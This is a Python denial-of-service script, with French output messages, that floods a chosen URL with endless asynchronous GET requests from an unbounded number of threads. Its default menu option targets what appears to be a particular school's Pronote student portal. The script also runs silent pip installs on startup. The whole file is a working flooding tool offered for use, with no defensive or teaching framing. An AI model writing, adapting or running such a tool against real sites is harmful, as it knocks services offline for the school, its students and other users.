import requests
import getpass
import json
import sys
import asyncio
import urllib
import time
import os
import threading
try:
    from pystyle import *
    import aiohttp
except ImportError:
    if os.name=="nt": os.system('pip install pystyle aiohttp'); import pystyle,aiohttp
    else: os.system('pip install --break-system-package pystle aiohttp');  import pystyle, aiohttp
def dos(url):

    def cls():
        osystem = sys.platform
        if osystem == 'win32': os.system('cls')
        else: os.system('clear')

    # Gui Start
    headers = {"User-Agent": "Flyer DoS"}
    loop = asyncio.new_event_loop()
    global r, reqs
    r = 0
    reqs = []
    print()
    time.sleep(0.2)
    print(url)
    async def fetch(session, url):
        global r, reqs
        start = int(time.time())
        try:
            crash = 0
            while True:
                try:
                    async with session.get(url, headers=headers) as response:
                        if response:
                            try:
                                set_end = int(time.time())
                                set_final = start - set_end
                                final = str(set_final).replace("-", "")
                            except:
                                pass
                            if response.status == 200:
                                try:
                                    r += 1
                                    reqs.append(response.status)
                                    sys.stdout.write(f"Requette : {str(len(reqs))} | ping : {final} | code status rendu => {str(response.status)} | crash status {crash} / 100\r")
                                except:
                                    pass
                            else:
                                reqs.append(response.status)
                                sys.stdout.write("nope\r")
                                crash+=1
                        else:
                            print(Colorate.Horizontal(Colors.red_to_green, "[-] le serveur ne repond pas, essaie plutard ou verifie l'adresse!"),end='\r')
                except:
                    pass
        except:
            pass
    urls = []
    urls.append(url)
    async def main():
        tasks = []
        async with aiohttp.ClientSession() as session:
            for url in urls:
                try:
                    tasks.append(fetch(session, url))
                    ddos = await asyncio.gather(*tasks)
                except:
                    pass
    def run():
        try:
            loop.run_forever(asyncio.run(main()))
        except:
            pass
    if __name__ == '__main__':
        active = []
        ths = []
        while True:
            try:
                while True:
                    th = threading.Thread(target=run)
                    try:
                        th.start()
                        ths.append(th)
                        sys.stdout.flush()
                    except RuntimeError:
                        pass
            except:
                pass
choice = input(f'''1) pronote
?) enter any link else''')
if choice == "1":
    link = "https://0770920g.index-education.net/pronote/eleve.html"
else:
    if not choice.startswith('http://'): link = "http://"+choice
    else: link = choice
dos(link)